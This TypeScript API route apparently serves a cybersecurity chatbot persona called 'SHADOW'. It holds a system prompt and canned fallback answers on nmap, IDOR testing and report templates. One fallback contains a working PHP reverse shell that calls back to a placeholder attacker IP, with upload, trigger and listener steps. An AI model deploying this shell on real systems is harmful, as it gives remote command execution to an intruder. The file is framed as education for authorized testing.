import { NextRequest, NextResponse } from "next/server";

const SYSTEM_PROMPT = `You are "SHADOW" — an elite AI cybersecurity assistant. You operate in a terminal environment and respond with technical precision.

## Your Capabilities:
1. **Pentesting Guidance** — Step-by-step methodology for web app pentesting, network recon, privilege escalation, Active Directory attacks
2. **Exploit Development** — Write and explain exploits in Python, Bash, PHP (reverse shells, RCE, SQLi, XSS, etc.)
3. **CTF Solutions** — Walk through CTF challenges with enumeration, exploitation, privilege escalation
4. **Writeup Generation** — Create professional penetration testing reports and CTF writeups
5. **Tool Usage** — Explain Nmap, Burp Suite, Metasploit, Gobuster, LinPEAS, etc.
6. **Education** — Teach cybersecurity concepts (OWASP Top 10, network protocols, cryptography, etc.)

## Response Format:
- Use clear markdown with code blocks for commands and exploits
- Always explain WHY each step works, not just what to do
- When writing exploits, include comments explaining each part
- For pentesting methodology, follow industry standards (PTES, OWASP)
- Use hacker/cool terminal aesthetics in responses when appropriate

## Rules:
- NEVER provide instructions for illegal activities against systems you don't own
- Always include responsible disclosure reminders
- If asked about illegal hacking, redirect to ethical pentesting
- Focus on education, CTFs, and authorized penetration testing

## Style:
- Professional but with personality — you're an AI assistant with hacker flair
- Use terminal-style formatting
- Be concise but thorough
- When generating reports, use proper security assessment formatting`;

export async function POST(req: NextRequest) {
  try {
    const { messages } = await req.json();

    if (!messages || !Array.isArray(messages)) {
      return NextResponse.json(
        { error: "Messages array is required" },
        { status: 400 }
      );
    }

    const apiKey = process.env.OPENROUTER_API_KEY;

    if (!apiKey) {
      // Fallback: return a simulated response if no API key
      const lastMessage = messages[messages.length - 1]?.content || "";
      const fallback = generateFallbackResponse(lastMessage);
      return NextResponse.json({
        message: {
          role: "assistant",
          content: fallback,
        },
      });
    }

    const response = await fetch(
      "https://openrouter.ai/api/v1/chat/completions",
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${apiKey}`,
          "Content-Type": "application/json",
          "HTTP-Referer": "https://an1en-cyber-portfolio.vercel.app",
          "X-Title": "SHADOW AI Assistant",
        },
        body: JSON.stringify({
          model: "openai/gpt-4o-mini",
          messages: [
            { role: "system", content: SYSTEM_PROMPT },
            ...messages.map((m: { role: string; content: string }) => ({
              role: m.role,
              content: m.content,
            })),
          ],
          max_tokens: 4096,
          temperature: 0.7,
        }),
      }
    );

    if (!response.ok) {
      const error = await response.text();
      console.error("OpenRouter API error:", error);
      return NextResponse.json(
        { error: "AI service temporarily unavailable" },
        { status: 502 }
      );
    }

    const data = await response.json();
    const content = data.choices?.[0]?.message?.content;

    if (!content) {
      return NextResponse.json(
        { error: "No response from AI" },
        { status: 502 }
      );
    }

    return NextResponse.json({
      message: {
        role: "assistant",
        content,
      },
    });
  } catch (error) {
    console.error("Chat API error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}

function generateFallbackResponse(query: string): string {
  const q = query.toLowerCase();
  if (q.includes("nmap") || q.includes("scan")) {
    return "## Nmap Scan Methodology\n\n### Initial Port Discovery\n```bash\nnmap -sS -T4 -p- <target> -oN initial.txt\n```\n\n### Service Enumeration\n```bash\nnmap -sV -sC -p <ports> <target> -oN enum.txt\n```\n\n### Vulnerability Scripts\n```bash\nnmap --script vuln -p <ports> <target>\n```\n\n**Key Flags:**\n- `-sS`: SYN stealth scan\n- `-sV`: Version detection\n- `-sC`: Default scripts (safe)\n- `-T4`: Faster timing\n- `-p-`: All 65535 ports\n- `-oN`: Normal output to file\n\n> Run Nmap with sudo for accurate OS detection via `-O` flag.";
  }
  if (q.includes("reverse shell") || q.includes("shell")) {
    return "## PHP Reverse Shell\n\n```php\n<?php\n$ip = 'YOUR_IP';  // Attacker IP\n$port = 1234;     // Listener port\n$sock = fsockopen($ip, $port);\nwhile ($cmd = fgets($sock)) {\n  $output = shell_exec($cmd);\n  fwrite($sock, $output);\n}\n?>\n```\n\n### Steps:\n1. **Start listener:** `nc -lvnp 1234`\n2. **Upload** reverse.php to target\n3. **Trigger:** curl http://target/uploads/reverse.php\n4. **Upgrade TTY:** `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`";
  }
  if (q.includes("idor") || q.includes("broken access")) {
    return "## IDOR (Insecure Direct Object Reference)\n\n**Vulnerability:** Application trusts user-supplied object references (IDs, cookies) without server-side validation.\n\n### Test Methodology:\n1. Login as user A, note your user ID from cookies/URL\n2. Try changing the ID to another user's ID\n3. Check if you can access their data\n\n### Example:\n```http\nGET /api/user/1337 HTTP/1.1\nCookie: user=1337\n```\nChange to:\n```http\nGET /api/user/34322 HTTP/1.1\nCookie: user=34322\n```\n\n### Fix:\n- Store session server-side (`$_SESSION`), not in cookies\n- Verify ownership on every request\n- Use UUIDs instead of sequential IDs";
  }
  if (q.includes("report") || q.includes("writeup")) {
    return "## Security Assessment Report Template\n\n```\n=========================================\n  SECURITY ASSESSMENT REPORT\n  Target: [target]\n  Date: [date]\n  Author: [name]\n=========================================\n\n[1] EXECUTIVE SUMMARY\n- Scope: [what was tested]\n- Findings: [X critical, Y high, Z medium]\n- Overall Risk: [Critical/High/Medium/Low]\n\n[2] METHODOLOGY\n- Reconnaissance\n- Scanning & Enumeration\n- Exploitation\n- Privilege Escalation\n- Post-Exploitation\n\n[3] FINDINGS\n\nFinding 1: [Title]\n  Severity: [Critical/High/Med/Low]\n  Location: [URL/IP + endpoint]\n  Description: [what and why it matters]\n  POC: [curl command or exploit]\n  Remediation: [how to fix]\n  CVSS: [score]\n\n[4] TOOLS USED\n- Nmap, Burp Suite, [others]\n\n[5] TIMELINE\n- [time] - Started enumeration\n- [time] - Discovered [finding]\n- [time] - Gained initial access\n- [time] - Escalated to root\n=================== END ===================\n```\n\nWant me to generate a full report based on your test? Provide the details and I'll fill it in.";
  }

  return `## SHADOW AI Assistant — Ready

\`\`\`
    ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
    ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
    ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
    ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝
\`\`\`

**Available Commands:**
\`\`\`
help              → Show this menu
scan/nmap         → Network scanning methodology
exploit           → Exploit development guide
reverse shell     → Reverse shell cheat sheet
idor              → IDOR testing guide
report            → Security report template
writeup           → CTF writeup structure
\`\`\`

> Type your cybersecurity question above. I can help with pentesting methodology, exploit code, CTF solutions, and security report generation.`;
}
